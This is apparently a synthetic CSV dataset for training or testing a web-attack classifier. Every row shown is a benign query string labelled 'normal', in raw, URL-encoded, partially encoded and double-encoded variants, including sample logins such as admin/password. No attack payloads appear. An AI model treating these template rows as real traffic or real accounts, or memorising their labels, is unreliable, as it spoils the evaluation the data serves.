payload,label,attack_type,variant_type,encoding_type,template_id,normalized_hash,payload_hash,length
category%253Delectronics%2526sort%253Dprice_asc,0,normal,standard,double_encoded,NORMAL_004,3ee95b9c61fa4b77311a09f4552335a5,076aedfb0c01e5563bf60d6038649618,47
tag%253Dnews,0,normal,standard,double_encoded,NORMAL_008,575c7c214c62c9772e051f7438d323e9,506e2b1cb6f7c09c8f59637d3b96257e,12
username%253Dadmin%2526password%253Dpassword%2526Login%253DLogin,0,normal,standard,double_encoded,NORMAL_018,d615e0e773b0ca46fe8a049c9031f892,96743c675a3915a9c89337428e6fd098,64
filter%3Dactive%26page%3D43,0,normal,standard,url_encoded,NORMAL_009,cc6e78472d73065ed5b56368d5f1601d,51baece92d33993132c646408dbfe4b2,27
query%3Dpython&lang%3Den,0,normal,standard,partially_encoded,NORMAL_011,c2fc3a9a3cf54a42fab066090528edf0,28727a4d358396fbf77f238cf1b11264,24
book_title%3DO%27Connor's+Guide,0,normal,standard,partially_encoded,NORMAL_013,b41b2822b837d4725e7c8a53bbc11bba,4e84668c64544f0f1668ba417167e901,31
category%3Dhome%26sort%3Dprice_asc,0,normal,standard,url_encoded,NORMAL_004,750befee352ad89e242e064d3c4c3384,e8eeca7a99ef2ec0a0bbd6073f1a268e,34
username%3Dadmin%26password%3Dpassword%26Login%3DLogin,0,normal,standard,url_encoded,NORMAL_018,7d3a9f97b8f1ce3dcf35bb65aa7be9ce,1b8a5b46f253b08981caeba3a228efa4,54
id%253D22%2526Submit%253DSubmit,0,normal,standard,double_encoded,NORMAL_001,0ddf13afe6ff119b0469fab7d1c119cf,b36cfbe8ffc3f5a9f37419b2544868cb,31
comment%253DUser%2527s%252Bfeedback%252Btext,0,normal,standard,double_encoded,NORMAL_014,3047dafc52116f6b71683f16dc85b6e0,110f4264b51228788af909e362cdd652,44
title%3DWeb_app%26submit%3DSearch,0,normal,standard,url_encoded,NORMAL_006,eec463de7d192726c817c647eb48de31,7d12a0132c406d55f1c77628e2ba9d9f,33
book_title=O'Connor's+Guide,0,normal,standard,raw,NORMAL_013,951370c123e030d14d618639ddd58e01,38b30641133000c7ae92cd69ed68d1c5,27
username%3Dalice&password=password123&Login%3DLogin,0,normal,standard,partially_encoded,NORMAL_016,4f356571d4fb0c98f97c65c1c4cdbc78,b154383cc61001824250a606ac02040f,51
tag=dev,0,normal,standard,raw,NORMAL_008,6647c39ef4d875b62c7d335d96759e61,6647c39ef4d875b62c7d335d96759e61,7
tag%3Dsecurity,0,normal,standard,partially_encoded,NORMAL_008,980591356e1f9c29c5c9e7acae119fa5,9e78fdceb0e294cf0b3edeb012bf9602,14
query=laptop&lang=en,0,normal,standard,raw,NORMAL_011,a7d291c75b96d2e37e1d699b659885ba,a7d291c75b96d2e37e1d699b659885ba,20
category%253Delectronics%2526sort%253Dnewest,0,normal,standard,double_encoded,NORMAL_004,75608e6a89c98d887d3b5fe9acc0beb3,36aef19c5540ac2076f680ebb211682a,44
user%253Dguest,0,normal,standard,double_encoded,NORMAL_005,f7a3434d9fe7026774fec5fdaa4b8e62,dee78985de19de7e9d5891f41375387a,14
product_id=22&qty%3D1,0,normal,standard,partially_encoded,NORMAL_012,7657b94f11375434ea7e2b3f82f132a8,11323cd47029ce3d9fd7594a75e01ec1,21
product_id%3D3&qty=1,0,normal,standard,partially_encoded,NORMAL_012,e2b17afddd5b254a984dcad2bb83b083,05943632ced71549d33a7eae45b9f917,20
article_id%253D9%2526author%253Dadmin_viewer,0,normal,standard,double_encoded,NORMAL_010,08e4c4a5f2302b188d10abd4d2b3adb6,cbf42dbbd2f385661af8b46479bc8bb2,44
query=machine_learning&lang=en,0,normal,standard,raw,NORMAL_011,82374b14320d851fd93dec3f20d0aeba,82374b14320d851fd93dec3f20d0aeba,30
page=41&limit=10,0,normal,standard,raw,NORMAL_002,1e0ff0bf0b12889d43dbdd3e5d7bd551,1e0ff0bf0b12889d43dbdd3e5d7bd551,16
title%3DMachine_learning%26submit%3DSearch,0,normal,standard,url_encoded,NORMAL_006,8fcd5200d09ec5d773f494f9f2f743ec,cab71ed3b3f72f6beb479c507eb5b065,42
user%253Duser123,0,normal,standard,double_encoded,NORMAL_005,f97c3b59c68d56f75ca65f5e024e19a1,7a21ffc85230e49b0d29b384cbcec313,16
username%3Duser123%26password%3Dpassword123%26Login%3DLogin,0,normal,standard,url_encoded,NORMAL_016,0a7cf820502fd6bf4341bb0542186717,fb5a1cdcb032fdea715f981d38787946,59
name%253DJohn%252BDoe%2526email%253Djohn%252540example.com,0,normal,standard,double_encoded,NORMAL_015,a9e7df41716249317c9630fb6f47467d,063866dcf2c0936bdec30abc19e56a16,58
filter%3Dactive%26page%3D35,0,normal,standard,url_encoded,NORMAL_009,b8c0148ae6f2272086c6aefe72fabb02,92d89ef593c00fb32186336f7b0e10f1,27
tag%3Dtech,0,normal,standard,partially_encoded,NORMAL_008,c3cc8a7cdaf87b7dce1087850e6ea232,9313ca0d225f0e27678f382483d6b96d,10
book_title%253DO%2527Connor%2527s%252BGuide,0,normal,standard,double_encoded,NORMAL_013,35da7c111d3200aee0c308fe9d33e114,d8eca00cf81ab8d5e6696464590fa5c3,43
username%253Dguest%2526password%253Dpassword123%2526Login%253DLogin,0,normal,standard,double_encoded,NORMAL_016,c94a723ea82cca596808a6e4636c77de,f6f8490445a346a679d509bb8bce12e1,67
tag%3Ddev,0,normal,standard,url_encoded,NORMAL_008,f819abc22bca62143bd30852cde6dc71,cee6f7868183eb0e4759a347ae6daaec,9
search%253Ddatabase,0,normal,standard,double_encoded,NORMAL_003,61a7eb97f349660a3d3c3835bd8c7f4e,c8ad13a782be4f8416b7a43968547f91,19
username%3Dalice%26password%3Dpassword123%26Login%3DLogin,0,normal,standard,url_encoded,NORMAL_016,db8282b257d641ba0f66db6375cf29ea,a50169fbcf3865795c2b2b6c462efb68,57
username%3Djohn_doe%26password%3Dpassword123%26Login%3DLogin,0,normal,standard,url_encoded,NORMAL_016,cfb6c46b7c659e0c8d48795a433949b9,fa57f9d975f824096bf33db63b7eb9d0,60
article_id=39&author=bob_smith,0,normal,standard,raw,NORMAL_010,c2cc1539f41fd3991595f2073555d98d,c2cc1539f41fd3991595f2073555d98d,30
date%253D2026-09-08%2526status%253Dactive,0,normal,standard,double_encoded,NORMAL_007,e6a0e89f7534860763c1c766255d6aff,551437001ce518bf2d813f96aab9e3ef,41
search%253Dmachine_learning,0,normal,standard,double_encoded,NORMAL_003,218932acc503a7f8871a8c958470abbf,05dc76c6aa8dc176199f4db39ec200fc,27
category=toys&sort=newest,0,normal,standard,raw,NORMAL_004,5a183bc3592dde83b4df8c493843fc44,5a183bc3592dde83b4df8c493843fc44,25
filter%253Dactive%2526page%253D12,0,normal,standard,double_encoded,NORMAL_009,82982b58e3d8c68acbeb65e831236746,ab169f512a6e8a11e784f11de7923218,33
name=John+Doe&email=john%40example.com,0,normal,standard,raw,NORMAL_015,6d344bea03588fc573d5f6adfd0231eb,f39370a82b26871da84d931e26671169,38
name%3DJohn+Doe&email%3Djohn%40example.com,0,normal,standard,partially_encoded,NORMAL_015,ba50f1ffcadb81b17fb2a8141eabf992,179c90cfd111895b6ba2e9c2aff612e3,42
query%3Dcybersecurity%26lang%3Den,0,normal,standard,url_encoded,NORMAL_011,06fd91ba242f69bdfcfdd21772eb4270,9af4382cbbe2cc9dd77221e7ac2f6397,33
id=17&Submit=Submit,0,normal,standard,raw,NORMAL_001,c3068a64c18957823a720fcb480261de,b1858e991f6f5b3b821661a265d571ec,19
search%3Ddatabase,0,normal,standard,url_encoded,NORMAL_003,d475a14909b89eba70da1dd4ec58919f,1c0e85e00a647ba2de14095fb840c06b,17
tag%253Dai,0,normal,standard,double_encoded,NORMAL_008,73a32832c33c9f5da9d351e1ef84291e,1d18d834cad2e8dfae6be36c28887995,10
article_id=28&author%3Duser123,0,normal,standard,partially_encoded,NORMAL_010,da3568f3d5f20a44e1751b7aeaa8aeb1,fb30c99b218bcb44ec75283c009d6037,30
book_title%3DO%27Connor%27s%2BGuide,0,normal,standard,url_encoded,NORMAL_013,979253c7a40879a6c00a3a9b02806368,4131fe78ba5f61792cedb3c1e4ddafcc,35
category%3Dtoys&sort=popularity,0,normal,standard,partially_encoded,NORMAL_004,157b1dbb5cc2f7ca104c0a289690e9f3,ce4afc20dfae150bf064d2e7491ccd59,31
username%3Djohn_doe&password%3Dpassword123&Login%3DLogin,0,normal,standard,partially_encoded,NORMAL_016,189dcb86ca72c56648cc72d584831f9a,f914c47a4520a2a68e8b1e25a3198a83,56
category%253Dtoys%2526sort%253Dnewest,0,normal,standard,double_encoded,NORMAL_004,7f3834836a0d7456a3def88a33e1370f,3eaae06fa044e8c5f6b509333fa1d245,37
category%3Dsports%26sort%3Dprice_asc,0,normal,standard,url_encoded,NORMAL_004,97bef96a7ab054b34f6cfae97b908dc5,07f9ac4c7731d90f297f387b20612bd9,36
product_id%3D13%26qty%3D1,0,normal,standard,url_encoded,NORMAL_012,c0c066ef6fda81c3550662333ac9b56c,01bfd18d67ec5efb0148d2f523c718e2,25
search%3Dbook,0,normal,standard,url_encoded,NORMAL_003,64b4d66ba0bc036b03ea73d6b39f8ab2,69f572d80ea6be7f5aa6f28cbc513fa7,13
query%3Dphone&lang%3Den,0,normal,standard,partially_encoded,NORMAL_011,6f98c9f6bf133bc48cc9acc6de59d925,ac460c91e9b5e8fc6e89a7feb3f0fba8,23
page%253D29%2526limit%253D10,0,normal,standard,double_encoded,NORMAL_002,5691d6e0335fbb0bb5eb3c50fb3a6957,41c46835cb8c84f732069da9bb30e29b,28
username%3Duser123&password=84&Login=Login,0,normal,standard,partially_encoded,NORMAL_017,51e217796b6a498a23e9fcd051458346,b8e19c4f4e3f1766006943783225c1c7,42
username%253Dadmin_viewer%2526password%253Dpassword123%2526Login%253DLogin,0,normal,standard,double_encoded,NORMAL_016,95582e1e9c0dae2486908fad9a9d505b,3546f843a9454a46c4f07362f897b973,74
page=43&limit=10,0,normal,standard,raw,NORMAL_002,8509179bdea8c4c29cedf6006e333d6e,8509179bdea8c4c29cedf6006e333d6e,16
filter=active&page=1,0,normal,standard,partially_encoded,NORMAL_009,efd55968c01ada90a8b7c53fc247ad2e,efd55968c01ada90a8b7c53fc247ad2e,20
query=web_app&lang=en,0,normal,standard,raw,NORMAL_011,f9485c9558b28249b3c5e091addd130b,f9485c9558b28249b3c5e091addd130b,21
article_id%3D4%26author%3Dbob_smith,0,normal,standard,url_encoded,NORMAL_010,16f3fe1cb9c7f3f1ccb4a500d562809c,cc41689395ba7673b2037a579d06a270,35
book_title=O%27Connor%27s+Guide,0,normal,standard,partially_encoded,NORMAL_013,988eec5338906c94c00522a9f9c1b97a,2612338d3e3d71fdd802349dd6022521,31
product_id%3D26%26qty%3D1,0,normal,standard,url_encoded,NORMAL_012,79d79c6e654c43fc2cdbbe8f449ad7e4,d9288d4d343ef7e341062ad5ae972770,25
product_id%3D13&qty%3D1,0,normal,standard,partially_encoded,NORMAL_012,f5e6ae9b350046be3aeedaf43ce80a3e,d1377461e497d0bb07cbcd4dda1512c8,23
user=bob_smith,0,normal,standard,raw,NORMAL_005,90641591fa0825cebc7ffb947ef0da2c,90641591fa0825cebc7ffb947ef0da2c,14
username%253Dbob_smith%2526password%253D61%2526Login%253DLogin,0,normal,standard,double_encoded,NORMAL_017,3d1e7200b4794e933439cc79d087b9b7,92e20489aba14cb86e2761baa30ae852,62
username%3Djohn_doe%26password%3D44%26Login%3DLogin,0,normal,standard,url_encoded,NORMAL_017,ebd7efcfc57cc60272f5c08038a378fb,0e3daadbcb0c127984ee189c1e39f66c,51
comment=User's+feedback+text,0,normal,standard,raw,NORMAL_014,ebe3aff662d58d459c529e7da8d84454,a2dc5819bf1c024fb1107e295d238284,28
query%3Ddatabase%26lang%3Den,0,normal,standard,url_encoded,NORMAL_011,204119159b322d291cb47d2ce85a14de,f8664db476f96d30c557be4f5a856cc3,28
username=admin&password%3Dpassword&Login=Login,0,normal,standard,partially_encoded,NORMAL_018,da5a35bb299613d75ff097427e26bbf1,5cfde2122feb6cd8ae4c13212adda59e,46
category=books&sort=popularity,0,normal,standard,raw,NORMAL_004,519a052940150d9172d575e84ced91cf,519a052940150d9172d575e84ced91cf,30
product_id%3D10%26qty%3D1,0,normal,standard,url_encoded,NORMAL_012,95c4def3a151bc01e440ce12a3385fe1,8ef7a7f6cbeab3889a2f164064cd9fee,25
id=24&Submit%3DSubmit,0,normal,standard,partially_encoded,NORMAL_001,853f93b167be36db256e7873eecad7d7,1e48360bf8e278fb526f10ac0d0f1659,21
category=toys&sort=price_desc,0,normal,standard,raw,NORMAL_004,9dbb8d506b2c55dd42e21e0c53ee5076,9dbb8d506b2c55dd42e21e0c53ee5076,29
date%3D2026-09-08&status%3Dactive,0,normal,standard,partially_encoded,NORMAL_007,3d08a8ac5aa750a4c61b19724768c0cb,9612400bc5fcdcf9b1684470a9e33f06,33
query%253Dphone%2526lang%253Den,0,normal,standard,double_encoded,NORMAL_011,e16a5370df901cd2bb3df96e8fc67c7a,d96f09bd40deff79ee6da1d5febafcc5,31
user=admin_viewer,0,normal,standard,raw,NORMAL_005,caf52476aadb4da63ab5d0f639485758,caf52476aadb4da63ab5d0f639485758,17
user%3Dadmin_viewer,0,normal,standard,partially_encoded,NORMAL_005,9cd20122be7172718ef2b3302e120d8a,d7bccf8208cf5540c344e124fd2c0eee,19
username%3Dguest%26password%3Dpassword123%26Login%3DLogin,0,normal,standard,url_encoded,NORMAL_016,0aa69f07cb44f7c26ab6f0dc2c59317a,b7c345d725c23ba065820054a3e8414f,57
product_id%253D32%2526qty%253D1,0,normal,standard,double_encoded,NORMAL_012,d78f485362a04f2c29d1b8fbe114c478,24f78ce4df67e842eb1a9ffecee1b30a,31
comment%3DUser%27s%2Bfeedback%2Btext,0,normal,standard,url_encoded,NORMAL_014,7bd03cabbe3599008d896d482a3c3dd6,6cc7001ca0d3e5e832fe6c57ffbff815,36
article_id%3D19%26author%3Dbob_smith,0,normal,standard,url_encoded,NORMAL_010,1c86521b94f27633700bd615ad88cdc7,ba49bf8f56784bc02b41e1734fa3bf35,36
user%3Dbob_smith,0,normal,standard,partially_encoded,NORMAL_005,fdffcf30627cc5708e42d348e990f8ad,2ca672ee78536bb13e069a3f777d8418,16
article_id%3D24&author%3Djohn_doe,0,normal,standard,partially_encoded,NORMAL_010,c1efbb55213532f69f2c63c5927ce76e,8284b24a07ee8984432655dcf1b9d40d,33
category%253Dhome%2526sort%253Dname_asc,0,normal,standard,double_encoded,NORMAL_004,b40c294611afdf93b7da5e2e05534feb,a2812f937eb942f68c57e8a16398432e,39
id%3D34%26Submit%3DSubmit,0,normal,standard,url_encoded,NORMAL_001,6328552d5cf04bfda6bd80bc1828bedb,d86e28a78416cf1a135300890660a15b,25
comment%3DUser's+feedback+text,0,normal,standard,partially_encoded,NORMAL_014,e01160663aa3efc2f58a11f442ddcff5,d36900fa04139238f2ae20e821932df6,30
product_id%3D29%26qty%3D1,0,normal,standard,url_encoded,NORMAL_012,17073ca37aa627a6d198c3ca653b6946,eb705fa152206bf809a6d1d578aa2480,25
tag%3Dtutorial,0,normal,standard,url_encoded,NORMAL_008,5dd02152268c26fd5cb23638184be6bc,15c0533aa6410b7bdda861fab0f3c9b6,14
article_id%3D48&author=john_doe,0,normal,standard,partially_encoded,NORMAL_010,3e9298b3f4dcfbe6a5e743a3f2bd6b02,0368c7124d5dcbd460c9a6fe3a311b07,31
category%3Dbooks&sort%3Dprice_asc,0,normal,standard,partially_encoded,NORMAL_004,a8b316cf736feb6532926d0e1da9575f,830e6e202486fcf77fedb9af4ac1032a,33
date=2026-09-08&status%3Dactive,0,normal,standard,partially_encoded,NORMAL_007,ffe72515b6c3c5b3753024dd89d95430,65d779cf5909000b078a48d4cb4ece17,31
category=sports&sort=name_asc,0,normal,standard,raw,NORMAL_004,dfa139c9ab45422ef2546c7ede169049,dfa139c9ab45422ef2546c7ede169049,29
username=admin&password=password&Login=Login,0,normal,standard,raw,NORMAL_018,7037f4d5553edd344015330f34979416,23856f0b00433ba86fb3350a4527ca84,44
tag%3Dai,0,normal,standard,url_encoded,NORMAL_008,fca7a584f5cba3a378baaf0ac67f2e69,bf1038bda56826db51fdf3199562f374,8
page%253D49%2526limit%253D10,0,normal,standard,double_encoded,NORMAL_002,c872b567b39a62e28ecf08a779753d74,f59b378e0e15b0327c923325c88c1fa4,28
product_id=10&qty%3D1,0,normal,standard,partially_encoded,NORMAL_012,395bc6f1930cbba55c67fbff04d06f36,b1dadaed4e39c1db343346562e94616c,21
id%253D32%2526Submit%253DSubmit,0,normal,standard,double_encoded,NORMAL_001,5fc63cf0e59658fdbb873547ebbe6069,495519805310c69889767082740f067b,31
title=Web_app&submit=Search,0,normal,standard,raw,NORMAL_006,0ac83625a0422be3a5d6de0fcdf074ea,463f5bcf5d2d993c77b957caabdbdb0a,27
tag%253Dtech,0,normal,standard,double_encoded,NORMAL_008,34ac78da60a87e5d777e01fe68c47b66,73ef76b0ffb086de9e91687af4667224,12
query=phone&lang=en,0,normal,standard,raw,NORMAL_011,587b48b75f5f91432515d82f4cdacee3,587b48b75f5f91432515d82f4cdacee3,19
product_id=25&qty=1,0,normal,standard,raw,NORMAL_012,021d8a773f951b84f56df36ade63a979,021d8a773f951b84f56df36ade63a979,19
title%3DPython&submit=Search,0,normal,standard,partially_encoded,NORMAL_006,04bdfcac2e36b3f053c7702b9b3eef57,fdd7c35e7b624bcdcadfb11a6462651e,28
query%253Dlaptop%2526lang%253Den,0,normal,standard,double_encoded,NORMAL_011,488a3eb28e62ec2cf5b5c3f386b79dab,18424492105e22b3089d6a027684bfab,32
username=admin_viewer&password=password123&Login=Login,0,normal,standard,raw,NORMAL_016,ff8bdeef2b381eaa1d4acb2ebf4fd0f7,3a92384bf16db99ea6c42a3814ccfbea,54
product_id%3D40%26qty%3D1,0,normal,standard,url_encoded,NORMAL_012,38b20a10267846c327a5046898c46b90,bdf26cdeaa49878041726095d48bd2c5,25
product_id%253D20%2526qty%253D1,0,normal,standard,double_encoded,NORMAL_012,7c6595e564704ec96783c63e30b7a345,bf7466b63767c4195faa22d171a5c92c,31
category%3Dhome%26sort%3Dpopularity,0,normal,standard,url_encoded,NORMAL_004,efb3bfbc9b6ba9c819a441187c97fbec,ad8dfa91a68fd8c76eb2168210d95a2e,35
article_id%3D8%26author%3Duser123,0,normal,standard,url_encoded,NORMAL_010,9ab14c96884cd491c7ce0dc89db3a44b,49bfd83e9384917a11a383bd5e721577,33
name%3DJohn%2BDoe%26email%3Djohn%2540example.com,0,normal,standard,url_encoded,NORMAL_015,5a07818f55ac3a98806be3be37c5b966,a575877aff4c55635f79c7c848563467,48
query%253Dmachine_learning%2526lang%253Den,0,normal,standard,double_encoded,NORMAL_011,54c1c2e17b58bb3008546146a6689677,97b41280364748e29da158112cc5c7b6,42
username=guest&password=password123&Login=Login,0,normal,standard,raw,NORMAL_016,0643f077d8d66cc9dfe86d2e6b182a9b,48b10f8d0f36fd2bdd48beab1149e8bc,47
page=30&limit=10,0,normal,standard,partially_encoded,NORMAL_002,690ed2f3539422a4bd4d469396e9d872,690ed2f3539422a4bd4d469396e9d872,16
title%3DBook&submit%3DSearch,0,normal,standard,partially_encoded,NORMAL_006,cac4e4c47faef6e33ab42af41099179e,370b9b01d8c403257e62122d079a7242,28
title%3DWeb_app&submit=Search,0,normal,standard,partially_encoded,NORMAL_006,ca627ce55204f2c2540fb1c95a27eb5c,0118a99791e7d573494ecac4cbce4c5d,29
article_id=26&author=john_doe,0,normal,standard,raw,NORMAL_010,c10bf98c921c748baefa516d8fb41154,c10bf98c921c748baefa516d8fb41154,29
product_id%253D35%2526qty%253D1,0,normal,standard,double_encoded,NORMAL_012,dba029909e61e4e8de436915d9895404,8119ac9778193951e4a85193390fc681,31
username=john_doe&password=69&Login=Login,0,normal,standard,raw,NORMAL_017,a0e6035d5eb8320fac8b109b870cfc86,aa443ef9d2b4797c850f3c1d23160e15,41
article_id%3D8&author%3Djohn_doe,0,normal,standard,partially_encoded,NORMAL_010,cc1eefd145ff6e3e664732755b5557fc,76c8fabc0534b2edcd005030de4ae83b,32
filter%3Dactive%26page%3D2,0,normal,standard,url_encoded,NORMAL_009,8b9c25ac7751851347a99d35e69a75e3,07a81451d3955ff441efabb2e57d8882,26
product_id=48&qty=1,0,normal,standard,raw,NORMAL_012,be0b7d6203a394fe719977363f5d1cfc,be0b7d6203a394fe719977363f5d1cfc,19
search%3Dpython,0,normal,standard,url_encoded,NORMAL_003,f67e45a235d08e5bf6cc9d7a0c74eacd,2f89484feab7f374fd53f2f1c021d469,15
user%3Dguest,0,normal,standard,url_encoded,NORMAL_005,870efc582d07ec747126b240fecd8daa,a9487a92648166fbe63f659166c0a545,12
tag=tech,0,normal,standard,raw,NORMAL_008,1736fc9fc706e195b1334c041236d54b,1736fc9fc706e195b1334c041236d54b,8
username%3Dalice%26password%3D72%26Login%3DLogin,0,normal,standard,url_encoded,NORMAL_017,dd7b34a1e71bb935699117aa62381a63,acc3f0727b827a744a6e5facb8b8c02f,48
search%3Dweb_app,0,normal,standard,url_encoded,NORMAL_003,6b261f30ea97f68994bc4f7123558883,c530729d60b74ca637d6ec366ac0c93e,16
id%3D31%26Submit%3DSubmit,0,normal,standard,url_encoded,NORMAL_001,ad1b925a61b5e773d9e18b875c390cad,e0848299eddbb3c5cc7e582df1cb5b75,25
username=admin&password=password&Login%3DLogin,0,normal,standard,partially_encoded,NORMAL_018,be7f5d86b090c38946ca164df228af54,d5f68df08525b659669d795d9c139600,46
user=guest,0,normal,standard,partially_encoded,NORMAL_005,519d7b73dfe68eecbd4876a3d192eaaf,519d7b73dfe68eecbd4876a3d192eaaf,10
title=Python&submit=Search,0,normal,standard,raw,NORMAL_006,4df03e8b9c4c911122d7a192290d81a6,861395a6c45db4e5c67887d3f9286012,26
tag%253Dsecurity,0,normal,standard,double_encoded,NORMAL_008,d0d640afeda7eafb8b1948e37ffbf991,89066fa051e2913062f5db184a5bdda8,16
book_title%3DO'Connor's+Guide,0,normal,standard,partially_encoded,NORMAL_013,281c7d400247797d82611dba43f27ec8,39e9caeff3091b6ed14e797171d5a5e2,29
book_title%3DO%27Connor%27s+Guide,0,normal,standard,partially_encoded,NORMAL_013,72085c364d7e009dc1a42c5792b7580a,c7170673b2f8c29d6c832b95bb9a5ed5,33
filter=active&page=12,0,normal,standard,raw,NORMAL_009,554bafea16bfe354dca150c0a6f952eb,554bafea16bfe354dca150c0a6f952eb,21
category%253Dbooks%2526sort%253Dprice_desc,0,normal,standard,double_encoded,NORMAL_004,148c5f7ba515bc754872dde3e94cd475,4fb5a322238387857a5d5359722e9e4b,42
username%3Dadmin&password=password&Login%3DLogin,0,normal,standard,partially_encoded,NORMAL_018,03778406f7ea53816e2b1ba108f0d37c,55b410997f1a63ee433d3ba32fd64354,48
query%253Ddatabase%2526lang%253Den,0,normal,standard,double_encoded,NORMAL_011,23d8e0b947c5f7f2144e0754755ba895,078483c6207c749c32df1ca90ee4040e,34
filter=active&page=24,0,normal,standard,raw,NORMAL_009,5a171c935aebb92105fa3b6092413c25,5a171c935aebb92105fa3b6092413c25,21
article_id=15&author=admin_viewer,0,normal,standard,raw,NORMAL_010,8d0a7cefac310f493dcd95435bca694e,8d0a7cefac310f493dcd95435bca694e,33
article_id%253D41%2526author%253Dalice,0,normal,standard,double_encoded,NORMAL_010,768d90ef0543d00d9cac311161022352,07ec3cfe763fc9d43d1fbfd759684c05,38
query%3Dpython%26lang%3Den,0,normal,standard,url_encoded,NORMAL_011,468c543987230a5350051eed9d037b6f,775c8795b2d929e62a40012c0ca5dae6,26
article_id%3D22&author=guest,0,normal,standard,partially_encoded,NORMAL_010,d928afb014e763a24e5d9b26d6f90add,6b88f532ea61c0eb6a2ccbbc6781d489,28
page%253D44%2526limit%253D10,0,normal,standard,double_encoded,NORMAL_002,1f688b2bec831771dd08d958f3d6b017,e4660cfa2723e457f2ad44b5b426bebc,28
user=alice,0,normal,standard,raw,NORMAL_005,1a668fdbbbd4326935f2cebfb88547fe,1a668fdbbbd4326935f2cebfb88547fe,10
category%253Dtoys%2526sort%253Dprice_desc,0,normal,standard,double_encoded,NORMAL_004,31743f18ebcbd1d028da18a025427aa8,fccd7844855b1afae65b4004c9e2918c,41
id=33&Submit=Submit,0,normal,standard,raw,NORMAL_001,5535160820919845dbf82f2b2e9b2661,9fea64f0450c8c6eb2ce4afd9fd20bf9,19
id%3D36%26Submit%3DSubmit,0,normal,standard,url_encoded,NORMAL_001,3506c85cb6e18e3d85d9a07b6334fe03,b5929dc06f173ee1b0e274670ffd9352,25
query%3Dbook&lang=en,0,normal,standard,partially_encoded,NORMAL_011,df5621ee5229c112dc7e77d5058a803d,48feef76cdfd68b71f99a003a5b2c296,20
title%3DCybersecurity&submit=Search,0,normal,standard,partially_encoded,NORMAL_006,b1b5f62c39a2fe153de8faddcbae8ee5,f0419126935cc5ce2eab66ee3394f774,35
title%3DCybersecurity%26submit%3DSearch,0,normal,standard,url_encoded,NORMAL_006,f28911163f9599e1384138d46b6a792b,ed73042f571cbe52c299bb1335b76b50,39
query%253Dbook%2526lang%253Den,0,normal,standard,double_encoded,NORMAL_011,8a942a7a28f9908c0ad440affdf01b63,9b12d9951d8defe58fb0f4d3080bc9bd,30
title%253DDatabase%2526submit%253DSearch,0,normal,standard,double_encoded,NORMAL_006,e92e89eb310a31c4713f47199bb4e305,6677352c5bc2d5e107995653713f98c7,40
username%253Djohn_doe%2526password%253Dpassword123%2526Login%253DLogin,0,normal,standard,double_encoded,NORMAL_016,583a82f5ccb2844dab2acd196c67d856,f978c4153584ebf646cece6daa5e6224,70
title%3DPhone&submit=Search,0,normal,standard,partially_encoded,NORMAL_006,ec6f029d340d7a546f0d99ed8f56b9a7,41b239a3b06208159d6b5ea9e4aa2512,27
article_id%3D35&author=guest,0,normal,standard,partially_encoded,NORMAL_010,a66c0a97ae1e75b7dc8de688b89e2d5b,834f41d7390cd6273437339bbd43a779,28
title%3DCybersecurity&submit%3DSearch,0,normal,standard,partially_encoded,NORMAL_006,3acbabf97a88f17dea71b2c656bd7c64,776683c4322ebe93b89be9dbc98c08f6,37
article_id=34&author%3Duser123,0,normal,standard,partially_encoded,NORMAL_010,631cb487f02d7d7de6bdf749d8865fbc,5bc6ed1abf357ce4a86f9d8ab10c469a,30
username%3Duser123&password%3D79&Login%3DLogin,0,normal,standard,partially_encoded,NORMAL_017,eb19f102e29a07b05e11c62ec344839e,05ffe66d3e10ce755652554c7ae453bb,46
article_id%253D35%2526author%253Dguest,0,normal,standard,double_encoded,NORMAL_010,1be2bb9da18ea5533eef9aac09e29a3b,bd8f2b147627df1884dee15b6a511846,38
search=machine_learning,0,normal,standard,partially_encoded,NORMAL_003,a6d3af61a20910d0dbfc3c9857a5d191,a6d3af61a20910d0dbfc3c9857a5d191,23
category%253Dclothing%2526sort%253Dpopularity,0,normal,standard,double_encoded,NORMAL_004,194ae15cfc1ec8b22445ff98caa5f113,b55a89a1b667d756ec830650103c19e1,45
username=admin&password%3Dpassword&Login%3DLogin,0,normal,standard,partially_encoded,NORMAL_018,e884536d527b9dad356c6c06644cc703,35a041b479a5dfa78d922b997a3bb28e,48
user%253Djohn_doe,0,normal,standard,double_encoded,NORMAL_005,40616890d59e10774808b49a083e066c,08457877e951ad2d905f0cf6653c7a07,17
query%3Ddatabase&lang=en,0,normal,standard,partially_encoded,NORMAL_011,3e52c6e274e8e5174051ed63195526f9,7b27ed98a0a97f3ffc90972716830397,24
product_id%3D33%26qty%3D1,0,normal,standard,url_encoded,NORMAL_012,37d8e779d67d7e40897c7ca4eade97ec,03e8877c40b918151bdf602bd68bdd18,25
title%253DPython%2526submit%253DSearch,0,normal,standard,double_encoded,NORMAL_006,71a644b84b87de07108e67502c2d0f54,5c318372ad48eb94b2bd203182d1e583,38
page%253D48%2526limit%253D10,0,normal,standard,double_encoded,NORMAL_002,e400ca1c3d406e3827d9730c0b71e01e,3c558dc73abe2f039946081a3b85ac95,28
product_id=9&qty=1,0,normal,standard,raw,NORMAL_012,339239666e78c9139977cd62d5fb0d7a,339239666e78c9139977cd62d5fb0d7a,18
page%3D37%26limit%3D10,0,normal,standard,url_encoded,NORMAL_002,05cb3daebb086109d4496925f9bcc00e,38fe1b18d6a3e30d0fc45beb5df684d0,22
username=admin_viewer&password=50&Login=Login,0,normal,standard,raw,NORMAL_017,ecc960c0bd7760ab4025fdd8e56116ea,12b7e584f21e124e564909cf532123cb,45
username%3Dadmin&password%3Dpassword&Login%3DLogin,0,normal,standard,partially_encoded,NORMAL_018,a5790569fe809a32ba457803862df33d,ae9fdb392f7e121e0d145d507f653fa9,50
category%3Dbooks%26sort%3Dprice_asc,0,normal,standard,url_encoded,NORMAL_004,6adcd3cf9b3979750f936ff7b3566c4b,65cf217882366e5bae9c269ceae606b7,35
query%253Dweb_app%2526lang%253Den,0,normal,standard,double_encoded,NORMAL_011,c902e98c4670a426df4cd19de8afb28e,1cb429aaf3e3120867c31a341a955a1f,33
title=Book&submit=Search,0,normal,standard,raw,NORMAL_006,ad607ac1dac25ced2447b5e143c0d46b,08bd40411ee7cf6378dffd0cd5b268b7,24
title%3DLaptop&submit%3DSearch,0,normal,standard,partially_encoded,NORMAL_006,0972db58379df195b7322bf83cae18b9,9a7c36d9bb18b795eae3c94c78cb7919,30
product_id%3D46%26qty%3D1,0,normal,standard,url_encoded,NORMAL_012,1526c5e2b13c12a00ec702b477368f3b,1f7f339a2eb227668b6529412a2b3c80,25
username=guest&password=password123&Login%3DLogin,0,normal,standard,partially_encoded,NORMAL_016,49ea5f7ff03e18ce85691b082d5b238b,20cebcd0a9af238e10717995fa0d2216,49
